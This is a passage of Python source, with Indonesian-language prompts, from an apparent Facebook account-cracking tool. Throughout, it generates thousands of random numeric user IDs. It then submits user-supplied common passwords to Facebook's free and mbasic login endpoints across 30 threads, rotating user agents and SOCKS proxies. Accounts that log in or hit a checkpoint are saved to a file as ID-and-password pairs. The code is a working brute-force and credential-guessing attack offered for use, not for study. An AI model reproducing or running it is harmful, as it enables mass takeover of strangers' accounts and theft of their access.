					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzz498(self):
		x = 111111111
		xx = 999999999
		idx = "4"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzz398(self):
		x = 111111111
		xx = 999999999
		idx = "3"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzz298(self):
		x = 111111111
		xx = 999999999
		idx = "2"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def free4(self, uid, pwx):
		nip=random.choice(prox)
		rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_basic4(self):
		print("")
		print(f"{P} [1] Cloning Id Running (1)94xxx")
		print(f"{P} [2] Cloning Id Running (2)94xxx")
		print(f"{P} [3] Cloning Id Running (3)94xxx")
		print(f"{P} [4] Cloning Id Running (4)94xxx")
		print(f"{P} [5] Cloning Id Running (5)94xxx")
		print(f"{P} [6] Cloning Id Running (6)94xxx")
		print(f"{P} [7] Cloning Id Running (7)94xxx")
		print(f"{P} [8] Cloning Id Running (8)94xxx")
		print(f"{P} [9] Cloning Id Running (9)94xxx")
		Runn = input(f"{P} Pilih : ")
		if Runn in ["1"]:
			self.runz198()
		elif Runn in ["2"]:
			self.runz298()
		elif Runn in ["3"]:
			self.runz398()
		elif Runn in ["4"]:
			self.runz498()
		elif Runn in ["5"]:
			self.runz598()
		elif Runn in ["6"]:
			self.runz698()
		elif Runn in ["7"]:
			self.runz798()
		elif Runn in ["8"]:
			self.runz898()
		elif Runn in ["9"]:
			self.runz998()
		else:
			print(f" {P} Isi Yang Benar") 
			self.old_basic4()
			
	def runz198(self):
		x = 111111111
		xx = 999999999
		idx = "1"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runz998(self):
		x = 111111111
		xx = 999999999
		idx = "9"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runz898(self):
		x = 111111111
		xx = 999999999
		idx = "8"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runz798(self):
		x = 111111111
		xx = 999999999
		idx = "7"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali") 
				Main()
		except Exception as e:exit(str(e))
			
	def runz698(self):
		x = 111111111
		xx = 999999999
		idx = "6"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runz598(self):
		x = 111111111
		xx = 999999999
		idx = "5"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runz498(self):
		x = 111111111
		xx = 999999999
		idx = "4"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runz398(self):
		x = 111111111
		xx = 999999999
		idx = "3"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runz298(self):
		x = 111111111
		xx = 999999999
		idx = "2"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def basic4(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2006%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2006%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
		
	def old_bapi4(self):
		print("")
		print(f"{P} [1] Cloning Id Running (1)94xxx")
		print(f"{P} [2] Cloning Id Running (2)94xxx")
		print(f"{P} [3] Cloning Id Running (3)94xxx")
		print(f"{P} [4] Cloning Id Running (4)94xxx")
		print(f"{P} [5] Cloning Id Running (5)94xxx")
		print(f"{P} [6] Cloning Id Running (6)94xxx")
		print(f"{P} [7] Cloning Id Running (7)94xxx")
		print(f"{P} [8] Cloning Id Running (8)94xxx")
		print(f"{P} [9] Cloning Id Running (9)94xxx")
		Runn = input(f"{P} Pilih : ")
		if Runn in ["1"]:
			self.run198()
		elif Runn in ["2"]:
			self.run298()
		elif Runn in ["3"]:
			self.run398()
		elif Runn in ["4"]:
			self.run498()
		elif Runn in ["5"]:
			self.run598()
		elif Runn in ["6"]:
			self.run698()
		elif Runn in ["7"]:
			self.run798()
		elif Runn in ["8"]:
			self.run898()
		elif Runn in ["9"]:
			self.run998()
		else:
			print(f" {P} Isi Yang Benar") 
			self.old_bapi4()
			
	def run198(self):
		x = 111111111
		xx = 999999999
		idx = "1"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def run998(self):
		x = 111111111
		xx = 999999999
		idx = "9"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
